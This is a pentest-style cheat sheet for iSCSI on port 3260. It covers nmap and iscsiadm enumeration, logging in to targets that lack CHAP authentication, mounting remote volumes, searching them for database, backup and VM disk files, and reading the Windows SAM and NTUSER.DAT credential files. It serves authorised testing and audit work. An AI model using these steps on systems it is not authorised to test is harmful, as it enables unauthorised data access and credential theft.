# Port 3260 - iSCSI

## Table of Contents
- [Enumeration](#enumeration)
- [Connect and Mount](#connect-and-mount)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 3260 --script "iscsi-info" $rhost && iscsiadm -m discovery -t sendtargets -p $rhost
```

### Nmap

```shell
nmap -sV -sC -p 3260 $rhost
nmap -p 3260 --script "iscsi-info" $rhost
```

### Discover Targets

```shell
# Using iscsiadm
iscsiadm -m discovery -t sendtargets -p $rhost

# List discovered targets
iscsiadm -m node
```

---

## Connect and Mount

### Login to Target

```shell
# Discover targets
iscsiadm -m discovery -t sendtargets -p $rhost:3260

# Login to target
iscsiadm -m node --targetname "iqn.2024-01.com.example:storage" -p $rhost --login

# Check connected sessions
iscsiadm -m session

# Find new disk
fdisk -l | grep -i "Disk /dev"
lsblk
```

### Mount iSCSI Volume

```shell
# After login, new disk appears (e.g., /dev/sdb)

# List partitions
fdisk -l /dev/sdb

# Mount partition
mount /dev/sdb1 /mnt/iscsi

# Access data
ls /mnt/iscsi
```

### Logout

```shell
# Unmount first
umount /mnt/iscsi

# Logout from target
iscsiadm -m node --targetname "iqn.2024-01.com.example:storage" -p $rhost --logout

# Delete saved node (optional)
iscsiadm -m node -o delete --targetname "iqn.2024-01.com.example:storage" -p $rhost
```

---

## Exploitation

### Access Without Authentication

```shell
# If CHAP auth is not required
iscsiadm -m discovery -t sendtargets -p $rhost
iscsiadm -m node -p $rhost --login

# Access all targets
```

### Sensitive Data Access

```shell
# After mounting iSCSI volume, look for:
# - Database files
# - Backup files
# - Configuration files
# - Virtual machine disks

# Mount and search
mount /dev/sdb1 /mnt/iscsi
find /mnt/iscsi -name "*.sql" -o -name "*.bak" -o -name "*.vmdk"
```

### Windows Disk Access

```shell
# If mounted disk is NTFS
apt install ntfs-3g
mount -t ntfs-3g /dev/sdb1 /mnt/iscsi

# Look for Windows files
cat /mnt/iscsi/Windows/System32/config/SAM
cat /mnt/iscsi/Users/*/NTUSER.DAT
```

### Virtual Machine Disks

```shell
# If .vmdk files found
# Convert and mount
qemu-img convert -O raw disk.vmdk disk.raw
losetup -fP disk.raw
mount /dev/loop0p1 /mnt/vm
```

---

## iSCSI with CHAP Authentication

```shell
# If CHAP required, set credentials
iscsiadm -m node --targetname "$target" -p $rhost --op update \
  -n node.session.auth.authmethod -v CHAP
iscsiadm -m node --targetname "$target" -p $rhost --op update \
  -n node.session.auth.username -v $username
iscsiadm -m node --targetname "$target" -p $rhost --op update \
  -n node.session.auth.password -v $password

# Then login
iscsiadm -m node --targetname "$target" -p $rhost --login
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `iscsiadm -m discovery -t sendtargets -p $rhost` | Discover targets |
| `iscsiadm -m node -p $rhost --login` | Login to target |
| `iscsiadm -m session` | List sessions |
| `iscsiadm -m node -p $rhost --logout` | Logout |
| `mount /dev/sdb1 /mnt/iscsi` | Mount volume |
